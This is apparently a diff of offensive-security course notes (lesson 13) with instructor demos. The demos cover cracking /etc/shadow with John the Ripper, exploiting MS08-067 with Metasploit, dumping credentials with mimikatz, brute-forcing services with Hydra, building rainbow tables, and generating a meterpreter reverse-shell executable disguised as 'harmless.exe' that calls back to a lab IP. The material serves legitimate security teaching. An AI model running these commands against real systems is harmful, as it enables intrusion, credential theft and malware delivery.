+image::../../resources/images/linux_13_5.png[cmds,height="350",width="300",float="left"]
+{empty} +
+
+
+==== 13.3 Define credentials
+.*DISCUSSION: What are credentials*
+* Username / Password
+* Biometrics
+* X.509 certificates
+* etc...
+
+==== 13.4 Perform credential cracking
+.*DEMO: Use john to break a shadow file*
+----
+unshadow /etc/passwd /etc/shadow > /tmp/mypass.txt                      #unshadow is deprecated in current version of JTR; JTR cracks salted passwords using only shadow file.
+john /tmp/mypass.txt
+----
+
+----
+#when john cracks a password it displays it and writes the output to john.pot; john will not attempt to re-crack any cracked passwords currently in john.pot
+john.pot must be removed first:
+find / -type f -name john.pot -exec rm {} \;                            #clears previously cracked passwords, so john can crack them again
+
+#to display passwords that john has already cracked:
+john --show wordlist.txt                                                #where wordlist.txt is the password/dictionary list you've been using all along
+
+[CTRL]+C                                                                #stops john and writes current progress to john.rec
+john --restore                                                          #automatically picks up where john left off
+----
+
+#JTR can be use to conduct password audits on both linux and windows passwords hashes
+
+==== 13.5 Identify purposes for Metasploit
+The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development.<<2>>
+
+The Metasploit Framework (MSF) is the de facto standard for pentesting.  The purpose of the framework is to provide a modular approach to testing remote systems against vulnerabilities.  MSF breaks attacks up into independant exploits that can be utilized with numerous different payloads.  After a successful exploitation, post-exploitation modules can be loaded into the various payloads as well.
+
+
+==== 13.6 Identify common Metasploit modules
+.*Meterpreter*
+* payload/*/meterpreter
+* Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.<<3>>
+
+.*multihandler*
+* exploit/multi/handler
+* generic payload handler configured to handle connections from exploits launched outside MSF
+
+.*psexec*
+* exploit/windows/psexec
+* Windows exploit module that takes advantage of Sysinternals psexec capability to execute a payload
+* requires credentials
+
+.*mimikatz*
+* post exploitation module for dumping the memory of a system to retrieve credentials
+
+.*DEMO: Metasploit Framework & MS08_067*
+
+#before exploiting the XP system, instructor logs into XP system and creates additional accounts, and logs into all the accounts using "switch user":
+
+image::../../resources/images/linux_13_12.png[taskmgr,height="150",width="350",float="left"]
+
+#having multiple users all logged in, puts their credentials into memory, and allows mimikatz to grab them ..
+----
+msfconsole -q
+use exploit/windows/smb/ms08_067_netapi
+set LHOST <IP>
+set LPORT <Port other than 4444>
+check
+exploit
+meterpreter> {getuid,hashdump,sysinfo,help}                     (ask students to ID the hash type, i.e. LM or NTLM)
+meterpreter> load mimikatz                                      (reads cleartext credential and tokens stored in memory)
+meterpreter> wdigest                                            (dumps cleartext " )  
+meterpreter> msv                                                (retrieves msv creds)
+meterpreter> mimikatz_command -f sekurlsa::searchPasswords      (reads cleartext credentials and tokens in LSA secrets (LSASS) process in memory)
+----
+
+image::../../resources/images/linux_13_7.png[ms080672,height="150",width="300",float="left"]
+
+#after exploiting the target and getting a shell, you can dump all sorts of usefull info from the target, as seen below +
+sysinfo meterpreter command not only tells us the service pack of the OS, but also how many users are currently logged in .. +
+
+image::../../resources/images/linux_13_8.png[meterpreter,height="350",width="750",float="left"]
+
+#use mimikatz, to scrape the targets memory for any cleartext credentials, as seen here: 
+
+image::../../resources/images/linux_13_9.png[lm,height="350",width="750",float="left"]
+
+#once we have the hashes of the target system, we can use either auxiliary/analyze/jtr_crack_fast or /usr/sbin/john to crack the hashes ..
+
+image::../../resources/images/linux_13_10.png[john,height="250",width="450",float="left"]
+
+#Note: the hash types here .. LM and NTLM
+#Note: that the LM hash for Joe is == Passw0rd, and Administrator == password, which are each only 8 chars long .. 
+----
+LM Password Characteristics:        restricted to max of 14 chars
+                                    password converted to UpperCase/not case sensitive (see John-The-Ripper's 1st attempt above)
+                                    null-padded up to 14 bytes
+                                    
+#we can see below that both Joe and SYSTEM/Administrator are using LM passowrds .. LM passwords are fairly easy to crack with a wordlist
+                                   
+Dan              lm{ 00000000000000000000000000000000 }, ntlm{ 623fc83e86dab4740a637e794ba0bbda }
+Tina             lm{ 00000000000000000000000000000000 }, ntlm{ b76c84374bd80c37029c1e492be5da55 }
+NT AUTHORITY     lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
+Joe              lm{ b34ce522c3e4c8774a3b108f3fa6cb6d }, ntlm{ a87f3a337d73085c45f9416be5787d86 }
+
+#we can see above that both Dan and Tina are using NTLM passwords ..  NTLM passwords are not as easy as LM passwords to crack
+
+NTLM Password Characteristics:      greater than 14 chars, up to 127 chars
+                                    passwords ARE case sensitive
+                                    
+----
+
+image::../../resources/images/linux_13_11.png[john2,height="100",width="450",float="left"]
+
+
+==== 13.7 Define rainbow tables
+.*Rainbow tables vs brute force*
+* Brute force:
+** Tries all possible combinations of a plain text to find corresponding hash
+** Only 100% way to find a plaintext that matches a hash
+
+.*DEMO: Hydra Service Brute Force*
+{empty} +
+
+* Hydra Features
+** can be configured to run against single target or list of targets 
+** can brute force a broad range of network-based services:
+
+Tool Link: https://www.thc.org/thc-hydra/
+
+Currently this tool supports: +
+	  Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, +
+	  HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-POST, HTTPS-HEAD, +
+	  HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, +
+	  PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, S7-300, SAP/R3, SIP, SMB, SMTP, +
+	  SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. +
+	  
+----
+usage:
+hydra -L {user_list} -P {password_list} {service://target IP}
+hydra --help
+
+#ensure the port you wish to brute force is open to you .. couple ways we can accomplish this ..
+nc {target IP} {target port #}
+nmap -Pn -n {target IP}
+
+#IF it's not open to you, adjust the windows firewall using the following commands:
+netsh advfirewall set allprofiles state on +
+netsh advfirewall firewall add rule name="Firewall open to attack" dir=in action=allow protocol=ANY remoteip={attacker IP}
+
+Example:
+hydra -l Joe -P dictionary.txt smb://192.168.217.192
+----
+
+image::../../resources/images/linux_13_13.png[hydra_brute,height="200",width="600",float="left"]
+{empty} +
+
+
+* Rainbow tables:
+** Takes advantage of time-memory-trade-off, and store condensed tables consisting of pre-computed hash chains
+** Allows for rapidly finding a plaintext input that matches a hash
+** Rainbow tables require a specific hashing algorithm, and a reduction function
+** Can be defeated with long/complex salting
+** Due to hashing collisions, a hash table will never encompass 100% of all possible hashes
+** only stores the initial and final resulting passwords of the chain (uses far less disk space than a dictionary list)
+
+http://kestas.kuliukas.com/RainbowTables/
+https://blogs.msdn.microsoft.com/tzink/2012/08/29/how-rainbow-tables-work/
+
+.*DEMO: Building Rainbow tables*
+{empty} +
+
+First we take a word from the dictionary, like "password" then we apply the chosen hash function, well say MD5: +
+This works best when you know the constraints of, or requirements for the organizations passwords.
+
+----
+echo -n "*password*" | md5sum | awk '{print $1}'
+*5f4dcc3b* 5aa765d61d8327deb882cf99                                     #we take the first 8 chars of the resulting hash, and hash that ..
+
+echo -n "*5f4dcc3b*" | md5sum | awk '{print $1}'
+*b19b2e72* 3fb88e48a0a8452768cecb0c                                     #we repeat the process again and again, till we hit our per-determined chain limit of 100,000 ..
+
+echo -n "*b19b2e72*" | md5sum | awk '{print $1}'
+a3488d0bd2fd476463ee2f852bcedd5e
+----
+
+.. and so on .. till we get the predermined number of hashes, well say 100,000 +
+BUT, we only store the *1st* plaintext word, "password", and the *last* hash of the entire hash table ..
+
+Then we simply follow this workflow to ID the correct table/chain to start with ..
+
+image::../../resources/images/linux_13_14.png[rainbow,height="400",width="500",float="left"]
+{empty} +
+
+git clone https://github.com/qsantos/rainbow.git +
+#use "gen.sh" to generate rainbow table ..
+*WARNING* .. takes 6 hrs to generate a 4-6 char table using single core CPU .. best to generate beforehand, then demo cracking speed on password.
+
+==== 13.8 Identify the purposes for custom malware
+.*DISCUSSION: Why is custom malware important?*
+* Allows for specific targeting of a single version of a single application found on the desired target network
+* Eliminates the target of opportunity approach, allows pin-point attacks
+* Involves the study of specific network/system configuration to look for vulnerabilities
+
+
+.*DEMO: Custom Malware Generation*
+{empty} +
+
+----
+#code below generate an executable file containing windows 32bit reverse shell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.217.142 LPORT=12345 -a x86 --platform windows -b "\x00\x0a\x0d\x20" -e generic/none -f exe -o harmless.exe
+
+#linux 32bit bind shell C shellcode:
+msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.217.142 LPORT=12345 -a x86 --platform linux EXITFUNC=thread -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai -f c  
+----
+
+*Check your malware for signature detection:* +
+
+----
+find / -type f -iname "Automater.py"
+sha256sum {exploit}
+python Automater.py {sha256_hash}
+----
+
+Your malware, likely, was detected, as there was no obfuscation done yet ..
+
+*Malware Obfuscation:*
+
+image::../../resources/images/linux_13_15.png[rainbow,height="400",width="850",float="left"]
+{empty} +
+
+more info on exe2hex:  https://github.com/g0tmi1k/exe2hex +
+
+==== 13.9 Identify zero configuration networking
+* The idea for zero configuration networking is that configured servers (DHCP, DNS) shouldn't be required for devices to be able to communicate with each other.
+* That means making it possible to take two laptop computers, and connect them with a crossover Ethernet cable, and have them communicate usefully using IP<<4>>
+* This is often seen when an interface is connected to a network, but is not assigned an IP address, it will automatically grab a random 169.254/16 address.
+
+
+ifdef::backend-docbook[]
+[index]
+Example Index
+////////////////////////////////////////////////////////////////
+The index is normally left completely empty, it's contents being
+generated automatically by the DocBook toolchain.
+////////////////////////////////////////////////////////////////
+endif::backend-docbook[]
+
+[bibliography]
+==== References
+- [[[1]]] http://nvlpubs.nist.gov/nistpubs/ir/2013/NIST.IR.7298r2.pdf
+- [[[2]]] https://en.wikipedia.org/wiki/Metasploit_Project#Metasploit_Framework
+- [[[3]]] https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/
+- [[[4]]] http://www.zeroconf.org/
